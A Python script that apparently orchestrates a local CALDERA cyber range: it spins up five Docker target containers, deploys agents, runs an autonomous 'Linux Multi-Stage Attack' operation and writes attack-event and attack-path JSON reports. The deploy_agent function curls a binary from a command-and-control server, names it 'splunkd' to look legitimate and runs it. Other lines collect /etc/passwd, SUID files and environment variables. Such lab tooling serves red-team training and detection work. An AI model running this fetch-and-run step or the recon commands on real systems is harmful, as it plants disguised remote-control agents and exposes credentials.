from dotenv import load_dotenv, find_dotenv
import os as _os; load_dotenv(find_dotenv())
import docker, requests, json, time, subprocess, datetime, os

CALDERA_API_KEY = os.getenv("CALDERA_API_KEY", "ADMIN123")
CALDERA_URL = os.getenv("CALDERA_URL", "http://localhost:8888")
HEADERS = {"KEY": CALDERA_API_KEY}
ADVERSARY_NAME = "Linux Multi-Stage Attack"
OPERATION_WAIT_SECONDS = 600

PROFILES = [
    {
        "profile_id": "web-server-01",
        "hostname": "web-server-01",
        "role": "nginx web server",
        "services": "nginx,php-fpm",
        "open_ports": "80,443,22",
        "image": "ubuntu-webserver:latest"
    },
    {
        "profile_id": "db-server-02",
        "hostname": "db-server-02",
        "role": "postgresql database server",
        "services": "postgresql,redis",
        "open_ports": "5432,6379,22",
        "image": "ubuntu-dbserver:latest"
    },
    {
        "profile_id": "dev-machine-03",
        "hostname": "dev-machine-03",
        "role": "developer workstation",
        "services": "nodejs,git-daemon",
        "open_ports": "3000,22",
        "image": "ubuntu-devmachine:latest"
    },
    {
        "profile_id": "ci-runner-04",
        "hostname": "ci-runner-04",
        "role": "jenkins CI runner",
        "services": "jenkins",
        "open_ports": "8080,22",
        "image": "ubuntu-cirunner:latest"
    },
    {
        "profile_id": "mail-server-05",
        "hostname": "mail-server-05",
        "role": "postfix mail server",
        "services": "postfix,dovecot",
        "open_ports": "25,143,22",
        "image": "ubuntu-mailserver:latest"
    }
]

LINK_STATUS = {
    0: "success",
    -2: "discarded",
    -3: "failed",
    1: "collected",
    124: "timeout"
}

client = docker.from_env()

def ts():
    return datetime.datetime.utcnow().isoformat() + "Z"

def log(msg):
    print("[" + datetime.datetime.now().strftime("%H:%M:%S") + "] " + msg)

def run_in_container(container_name, cmd):
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "bash", "-c", cmd],
            capture_output=True, text=True, timeout=15
        )
        return result.stdout.strip()
    except Exception as e:
        return "ERROR: " + str(e)

def get_adversary_id():
    resp = requests.get(CALDERA_URL + "/api/v2/adversaries", headers=HEADERS, timeout=10)
    for adv in resp.json():
        if adv.get("name") == ADVERSARY_NAME:
            return adv.get("adversary_id")
    return None

def create_operation(adversary_id, op_name):
    payload = {
        "name": op_name,
        "adversary": {"adversary_id": adversary_id},
        "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
        "group": "red",
        "state": "running",
        "autonomous": 1,
        "obfuscator": "plain-text",
        "auto_close": False,
        "jitter": "2/8",
        "source": {"id": "ed32b9c3-9593-4c33-b0db-e2007315096b"},
        "visibility": 51
    }
    resp = requests.post(CALDERA_URL + "/api/v2/operations",
                         headers=HEADERS, json=payload, timeout=10)
    if resp.status_code in [200, 201]:
        return resp.json().get("id")
    log("[!] Failed to create operation: " + str(resp.status_code) + " " + resp.text[:200])
    return None

def stop_operation(op_id):
    requests.patch(CALDERA_URL + "/api/v2/operations/" + op_id,
                   headers=HEADERS, json={"state": "finished"}, timeout=10)

def get_links(op_id):
    resp = requests.get(CALDERA_URL + "/api/v2/operations/" + op_id + "/links",
                        headers=HEADERS, timeout=15)
    if resp.status_code == 200:
        return resp.json()
    return []

def get_report(op_id):
    resp = requests.post(CALDERA_URL + "/api/v2/operations/" + op_id + "/report",
                         headers=HEADERS, json={"enable_agent_output": True}, timeout=15)
    if resp.status_code == 200:
        return resp.json()
    return {}

def collect_system_profile(container_name, profile):
    return {
        "profile_id": profile["profile_id"],
        "role": profile["role"],
        "simulated_services": profile["services"],
        "simulated_ports": profile["open_ports"],
        "hostname": run_in_container(container_name, "hostname"),
        "os_release": run_in_container(container_name, "cat /etc/os-release"),
        "kernel": run_in_container(container_name, "uname -a"),
        "users": run_in_container(container_name, "cat /etc/passwd"),
        "processes": run_in_container(container_name, "ps aux --no-headers"),
        "network": run_in_container(container_name, "ss -tulpn"),
        "interfaces": run_in_container(container_name, "ip addr show"),
        "routes": run_in_container(container_name, "ip route"),
        "crontabs": run_in_container(container_name, "cat /etc/crontab 2>/dev/null"),
        "suid_files": run_in_container(container_name, "find / -perm -4000 -type f 2>/dev/null"),
        "installed_pkgs": run_in_container(container_name, "dpkg -l 2>/dev/null | awk 'NR>5{print $2,$3}'"),
        "shadow_perms": run_in_container(container_name, "ls -la /etc/shadow"),
        "env_vars": run_in_container(container_name, "env"),
        "disk": run_in_container(container_name, "df -h")
    }

def get_monitor_logs(container_name):
    raw = run_in_container(container_name, "cat /var/log/sandbox/events.log 2>/dev/null | tail -200")
    events = []
    for line in raw.split("\n"):
        line = line.strip()
        if not line:
            continue
        try:
            events.append(json.loads(line))
        except Exception:
            events.append({"raw": line})
    return events

def parse_links(links, profile_id):
    events = []
    for lnk in links:
        if lnk.get("host", "") not in [profile_id, ""]:
            paw_host = lnk.get("host", "")
            if paw_host and paw_host != profile_id:
                continue
        ability = lnk.get("ability", {})
        status_code = lnk.get("status", -2)
        raw_output = lnk.get("output", "")
        if isinstance(raw_output, dict):
            output_str = raw_output.get("stdout", "") + raw_output.get("stderr", "")
        else:
            output_str = str(raw_output)
        cmd = lnk.get("plaintext_command") or lnk.get("command", "")
        events.append({
            "timestamp": lnk.get("finish") or lnk.get("decide") or ts(),
            "event_type": "ATTACK_TECHNIQUE",
            "link_id": lnk.get("id", ""),
            "tactic": ability.get("tactic", "unknown"),
            "technique_id": ability.get("technique_id", "unknown"),
            "technique_name": ability.get("technique_name", "unknown"),
            "ability_name": ability.get("name", "unknown"),
            "command": cmd,
            "status_code": status_code,
            "status_meaning": LINK_STATUS.get(status_code, "unknown"),
            "output": output_str[:2000],
            "executor": lnk.get("executor", {}).get("name", "sh"),
            "host": lnk.get("host", profile_id),
            "pid": lnk.get("pid", None),
            "agent_paw": lnk.get("paw", "")
        })
    return events

def write_output_files(profile, attack_events, monitor_logs, system_profile, report):
    timestamp = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    profile_id = profile["profile_id"]

    events_doc = {
        "meta": {
            "profile_id": profile_id,
            "role": profile["role"],
            "operation_id": report.get("id", ""),
            "operation_name": report.get("name", ""),
            "generated_at": ts(),
            "total_attack_events": len(attack_events),
            "total_monitor_events": len(monitor_logs)
        },
        "system_profile": system_profile,
        "attack_events": attack_events,
        "monitor_events": monitor_logs
    }

    chain = []
    seen_tactics = []
    impacted_assets = []
    for i, ev in enumerate(attack_events):
        tactic = ev["tactic"]
        chain.append({
            "step": i + 1,
            "tactic": tactic,
            "technique_id": ev["technique_id"],
            "technique_name": ev["technique_name"],
            "ability": ev["ability_name"],
            "command": ev["command"],
            "outcome": ev["status_meaning"],
            "output_preview": ev["output"][:300]
        })
        if tactic not in seen_tactics:
            seen_tactics.append(tactic)
        if ev["status_code"] == 0:
            cmd = ev["command"].lower()
            if "/etc/shadow" in cmd: impacted_assets.append("/etc/shadow")
            if "/etc/passwd" in cmd: impacted_assets.append("/etc/passwd")
            if "cron" in cmd: impacted_assets.append("/etc/cron")
            if "useradd" in cmd: impacted_assets.append("user_accounts")
            if "find" in cmd and "perm" in cmd: impacted_assets.append("suid_binaries")

    success_count = sum(1 for e in attack_events if e["status_code"] == 0)
    paths_doc = {
        "meta": {"profile_id": profile_id, "generated_at": ts()},
        "summary": {
            "total_links": len(attack_events),
            "successful": success_count,
            "failed": len(attack_events) - success_count,
            "tactics_covered": seen_tactics,
            "kill_chain_coverage": str(len(seen_tactics)) + " tactics"
        },
        "attack_chain": chain,
        "impacted_assets": list(set(impacted_assets)),
        "system_context": {
            "hostname": system_profile.get("hostname"),
            "role": profile["role"],
            "kernel": system_profile.get("kernel"),
            "os": system_profile.get("os_release", "")[:200]
        }
    }

    output_dir = os.path.expanduser("~/Desktop/CyberLab/output")
    os.makedirs(output_dir, exist_ok=True)
    ef = output_dir + "/events_" + profile_id + "_" + timestamp + ".json"
    pf = output_dir + "/attack_paths_" + profile_id + "_" + timestamp + ".json"
    with open(ef, "w") as f: json.dump(events_doc, f, indent=2)
    with open(pf, "w") as f: json.dump(paths_doc, f, indent=2)
    return ef, pf, success_count

def spawn_container(profile):
    name = "target-" + profile["profile_id"]
    try:
        old = client.containers.get(name)
        log("  Removing existing container: " + name)
        old.stop()
        old.remove()
    except docker.errors.NotFound:
        pass
    container = client.containers.run(
        profile["image"],
        detach=True,
        name=name,
        hostname=profile["hostname"],
        network="caldera-net",
        environment={
            "PROFILE_ID": profile["profile_id"],
            "PROFILE_ROLE": profile["role"],
            "SIMULATED_SERVICES": profile["services"],
            "SIMULATED_PORTS": profile["open_ports"]
        },
        cap_add=["SYS_PTRACE", "NET_ADMIN"],
        security_opt=["seccomp=unconfined"],
        extra_hosts={"host.docker.internal": "host-gateway"}
    )
    return container

def deploy_agent(container_name):
    cmd = (
        "cd /tmp && server='http://host.docker.internal:8888'; "
        "curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' "
        "$server/file/download > splunkd; "
        "chmod +x splunkd; "
        "./splunkd -server $server -group red -v >> /tmp/agent.log 2>&1 &"
    )
    subprocess.run(
        ["docker", "exec", "-d", container_name, "bash", "-c", cmd],
        capture_output=True
    )

def wait_for_agents(expected_count, timeout=120):
    log("Waiting for " + str(expected_count) + " agents to connect (timeout=" + str(timeout) + "s)...")
    start = time.time()
    while time.time() - start < timeout:
        resp = requests.get(CALDERA_URL + "/api/v2/agents", headers=HEADERS, timeout=10)
        agents = [a for a in resp.json() if a.get("group") == "red" and a.get("watchdog", 1) == 0 or a.get("sleep_max", 0) > 0]
        alive = [a for a in resp.json() if a.get("group") == "red"]
        if len(alive) >= expected_count:
            log("All " + str(len(alive)) + " agents connected.")
            return True
        log("  " + str(len(alive)) + "/" + str(expected_count) + " agents connected, waiting...")
        time.sleep(10)
    log("[!] Timeout waiting for agents. Proceeding with connected agents.")
    return False

print("\n" + "=" * 60)
print("  CYBERLAB MULTI-TARGET ORCHESTRATOR")
print("  Targets: " + str(len(PROFILES)) + " containers")
print("=" * 60 + "\n")

log("PHASE 1: Spawning " + str(len(PROFILES)) + " containers...")
containers = []
for profile in PROFILES:
    name = "target-" + profile["profile_id"]
    log("  Spawning " + name + " (" + profile["role"] + ")")
    container = spawn_container(profile)
    containers.append((container, profile))
log("All containers started.")

log("PHASE 2: Waiting 15s for containers to initialize...")
time.sleep(15)

log("PHASE 3: Deploying CALDERA agents...")
for container, profile in containers:
    name = "target-" + profile["profile_id"]
    deploy_agent(name)
    log("  Agent deployed to " + name)

wait_for_agents(len(PROFILES))

log("PHASE 4: Getting adversary ID...")
adv_id = get_adversary_id()
if not adv_id:
    log("[!] Could not find adversary '" + ADVERSARY_NAME + "'. Make sure it exists in CALDERA UI.")
    exit(1)
log("  Adversary ID: " + adv_id)

op_name = "Multi-Target Run " + datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
log("PHASE 5: Creating operation '" + op_name + "'...")
op_id = create_operation(adv_id, op_name)
if not op_id:
    log("[!] Failed to create operation via API. Create it manually in the UI and re-run collector only.")
    exit(1)
log("  Operation ID: " + op_id)

log("PHASE 6: Waiting " + str(OPERATION_WAIT_SECONDS) + "s for attacks to complete...")
for i in range(0, OPERATION_WAIT_SECONDS, 30):
    time.sleep(30)
    links = get_links(op_id)
    done = sum(1 for l in links if l.get("status") in [0, -2, -3])
    log("  " + str(i+30) + "s elapsed | " + str(len(links)) + " links total | " + str(done) + " completed")

log("PHASE 7: Stopping operation and collecting results...")
stop_operation(op_id)
time.sleep(5)

all_links = get_links(op_id)
report = get_report(op_id)
log("Total links collected: " + str(len(all_links)))

log("PHASE 8: Generating output files per container...")
print()
results = []
for container, profile in containers:
    container_name = "target-" + profile["profile_id"]
    log("Processing " + container_name + "...")
    host_links = [l for l in all_links if l.get("host", "") == profile["hostname"]]
    if not host_links:
        log("  No host-matched links, using all links for this container")
        host_links = all_links
    attack_events = parse_links(host_links, profile["profile_id"])
    system_profile = collect_system_profile(container_name, profile)
    monitor_logs = get_monitor_logs(container_name)
    ef, pf, success = write_output_files(profile, attack_events, monitor_logs, system_profile, report)
    results.append((profile["profile_id"], profile["role"], len(attack_events), success, ef, pf))
    log("  Done: " + str(success) + "/" + str(len(attack_events)) + " attacks succeeded")

print("\n" + "=" * 60)
print("  ALL DONE — OUTPUT SUMMARY")
print("=" * 60)
for pid, role, total, success, ef, pf in results:
    print("\n  [" + pid + "] " + role)
    print("    Attacks: " + str(success) + "/" + str(total) + " succeeded")
    print("    Events : " + os.path.basename(ef))
    print("    Paths  : " + os.path.basename(pf))

print("\n  All files in: ~/Desktop/CyberLab/output/")
print("=" * 60 + "\n")
